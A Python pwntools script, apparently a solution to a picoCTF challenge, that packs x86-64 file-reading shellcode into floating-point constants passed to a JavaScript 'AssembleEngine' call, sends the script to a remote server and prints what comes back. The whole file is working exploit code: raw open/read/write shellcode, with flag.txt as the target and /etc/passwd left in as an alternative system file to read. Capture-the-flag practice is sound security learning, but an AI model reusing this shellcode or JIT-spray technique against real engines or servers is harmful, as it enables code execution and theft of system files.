import struct
from pwn import *
import sys

context.update(arch='amd64', os='linux', endian='little')


def float_to_bytes(b, little=True):
    ret = struct.pack('d', b)
    if little:
        ret = list(reversed(ret))
    return bytes(ret)


def bytes_to_float(b, little=True):
    if little:
        b = list(reversed(b))
    return struct.unpack('d', bytes(b))


file = '/etc/passwd'
file = 'flag.txt'

shellcode = b'\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05'
# shellcode += b'\x6a\x3c\x58\x0f\x05'
shellcode += b'\x90\x90\x90\x90\x90'
shellcode += b'\xe8\xcc\xff\xff\xff'
shellcode += file.encode()

rem = (8 - (len(shellcode) % 8)) % 8
shellcode += b'\x00' * rem

floats = []
for i in range(len(shellcode) // 8):
    mode = False
    code = shellcode[i * 8:(i + 1) * 8]
    cur = bytes_to_float(code, mode)[0]
    if cur != cur:
        print(code)
    floats.append(cur)

payload = 'AssembleEngine([' + ', '.join([str(f) for f in floats]) + ']);\n'

with open('script.js', 'w+') as fp:
    fp.write(payload)

host = 'mercury.picoctf.net'
port = 17805

p = remote(host, port)
# p = process('server.py')

p.sendline(str(len(payload)).encode())
p.send(payload)

p.recvuntil(b'Stdout ')

outp = p.recvline().strip()
outp = eval(outp).decode()

print(outp)

p.close()
